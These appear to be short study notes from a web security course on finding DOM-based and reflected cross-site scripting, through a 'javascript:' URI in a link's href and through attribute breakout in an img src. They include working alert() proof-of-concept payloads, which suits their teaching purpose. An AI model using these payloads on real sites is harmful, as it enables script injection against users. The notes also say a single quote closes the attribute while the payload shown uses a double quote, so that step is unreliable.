# Section 10: DOM XSS Vulnerabilities

## Discovering a Reflected DOM XSS in a Link

Example: The return path on a back link is populated from a query parameter in the Link

```
<a id="backLink" href="zaidzaid">Back</a>
```

Can run JavaScript within href:

`feeback?returnPath=javascript:alert(3)`

```
<a id="backLink" href="javascript:alert(3)">Back</a>
```

---

## Discoverting a Reflected XSS in an Image Tag

Example: Typing in a search box, the content is being displayed in `img` `src`, as part of the image path

Type a single quote to close `src="` quote:

Search Term:
```
"><script>alert(1)</script>//
```

or with less tags:

```
" onload=alert(3)
```

---
